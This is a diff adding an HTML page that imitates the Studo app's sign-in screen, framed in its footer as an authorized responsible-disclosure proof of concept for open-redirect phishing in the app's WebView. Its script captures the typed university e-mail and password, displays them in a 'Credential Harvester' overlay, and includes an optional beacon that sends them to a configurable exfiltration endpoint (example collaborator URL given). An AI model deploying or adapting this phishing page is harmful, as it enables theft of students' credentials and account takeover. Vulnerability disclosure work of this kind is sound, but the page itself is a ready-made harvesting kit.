@@ -1,0 +1,121 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="light">
+<title>Studo · Sign in</title>
+<style>
+  /* High-contrast, force-dark-tolerant: legible whether or not Studo inverts it. */
+  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body { margin: 0; padding: 0; background: #f3f4f7; color: #16181d;
+               font-family: -apple-system, "Segoe UI", Roboto, system-ui, sans-serif; }
+  .wrap { min-height: 100vh; display: flex; flex-direction: column; align-items: center;
+          padding: 28px 18px 16px; }
+  .logo { font-family: "Brush Script MT", "Segoe Script", cursive; font-size: 52px;
+          color: #e0322f; margin: 18px 0 4px; font-weight: 700; }
+  .sub { color: #6b7280; font-size: 14px; margin-bottom: 22px; }
+  .card { width: 100%; max-width: 380px; background: #ffffff; border: 1px solid #e5e7eb;
+          border-radius: 14px; padding: 22px 20px; box-shadow: 0 6px 24px rgba(0,0,0,.08); }
+  h1 { font-size: 19px; margin: 2px 0 16px; }
+  label { display: block; font-size: 13px; font-weight: 600; color: #374151; margin: 14px 0 6px; }
+  input { width: 100%; padding: 13px 12px; font-size: 16px; border: 1px solid #cbd0d8;
+          border-radius: 9px; background: #fff; color: #16181d; }
+  input:focus { outline: none; border-color: #e0322f; box-shadow: 0 0 0 3px rgba(224,50,47,.15); }
+  .btn { width: 100%; margin-top: 20px; padding: 14px; font-size: 16px; font-weight: 700;
+         color: #fff; background: #e0322f; border: none; border-radius: 9px; }
+  .btn:active { background: #b9241f; }
+  .links { text-align: center; margin-top: 16px; font-size: 13px; }
+  .links a { color: #e0322f; text-decoration: none; }
+  .foot { color: #9aa1ad; font-size: 11px; text-align: center; margin-top: auto; padding-top: 22px;
+          line-height: 1.5; }
+
+  /* Credential Harvester modal */
+  .ovl { position: fixed; inset: 0; background: rgba(0,0,0,.72); display: none;
+         align-items: center; justify-content: center; padding: 18px; z-index: 9999; }
+  .ovl.show { display: flex; }
+  .modal { width: 100%; max-width: 380px; background: #14161b; color: #f5f6f8;
+           border: 2px solid #e0322f; border-radius: 14px; padding: 20px; }
+  .modal h2 { margin: 0 0 8px; font-size: 18px; color: #ff5a55; }
+  .modal p  { font-size: 13px; line-height: 1.5; color: #c8ccd4; margin: 8px 0; }
+  .grab { background: #000; border: 1px solid #333; border-radius: 9px; padding: 12px;
+          font-family: ui-monospace, Menlo, Consolas, monospace; font-size: 13px;
+          color: #34d399; word-break: break-all; margin: 12px 0; }
+  .grab b { color: #fbbf24; }
+  .mbtn { width: 100%; margin-top: 8px; padding: 12px; font-size: 15px; font-weight: 700;
+          color: #fff; background: #e0322f; border: none; border-radius: 9px; }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="logo">Studo</div>
+  <div class="sub">Your student companion</div>
+
+  <div class="card">
+    <h1>Sign in to continue</h1>
+    <form id="f" autocomplete="on">
+      <label for="u">University e-mail</label>
+      <input id="u" name="username" type="email" autocomplete="username"
+             inputmode="email" placeholder="student@university.edu" required>
+      <label for="p">Password</label>
+      <input id="p" name="password" type="password" autocomplete="current-password"
+             placeholder="Your university password" required>
+      <button class="btn" type="submit">Sign in</button>
+    </form>
+    <div class="links"><a href="#" onclick="return false">Forgot password?</a></div>
+  </div>
+
+  <div class="foot">
+    Authorized security PoC — demonstrates open-redirect → phishing in Studo's in-app WebView.<br>
+    No data leaves this page. Studo / Moshbit responsible-disclosure testing.
+  </div>
+</div>
+
+<!-- Credential Harvester proof -->
+<div class="ovl" id="ovl">
+  <div class="modal">
+    <h2>🎣 Credential Harvester</h2>
+    <p>This page was loaded <b style="color:#fff">inside the Studo app</b> via an unvalidated
+       open redirect. The victim believes this is the real Studo login. The credentials they just
+       typed are now in the attacker's hands:</p>
+    <div class="grab" id="grab"></div>
+    <p>In a live attack these are POSTed to the attacker's server. Impact: full account takeover
+       of the victim's university / Studo account.</p>
+    <button class="mbtn" onclick="document.getElementById('ovl').classList.remove('show')">Close PoC</button>
+  </div>
+</div>
+
+<script>
+(function () {
+  // OPTIONAL live-capture beacon. Leave empty for a self-contained PoC (nothing leaves the page).
+  // To prove server-side capture, set to your collaborator/webhook URL, e.g.
+  //   var HARVEST_ENDPOINT = "https://xxxx.oastify.com/c";
+  var HARVEST_ENDPOINT = "";
+
+  document.getElementById("f").addEventListener("submit", function (ev) {
+    ev.preventDefault();
+    var u = document.getElementById("u").value || "(empty)";
+    var p = document.getElementById("p").value || "(empty)";
+
+    document.getElementById("grab").innerHTML =
+      "<b>username:</b> " + esc(u) + "<br><b>password:</b> " + esc(p) +
+      "<br><b>origin:</b> " + esc(location.href);
+    document.getElementById("ovl").classList.add("show");
+
+    if (HARVEST_ENDPOINT) {
+      try {
+        new Image().src = HARVEST_ENDPOINT + "?u=" + encodeURIComponent(u) +
+                          "&p=" + encodeURIComponent(p) + "&t=" + Date.now();
+      } catch (e) {}
+    }
+  });
+
+  function esc(s) {
+    return String(s).replace(/[&<>"']/g, function (c) {
+      return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c];
+    });
+  }
+})();
+</script>
+</body>
+</html>
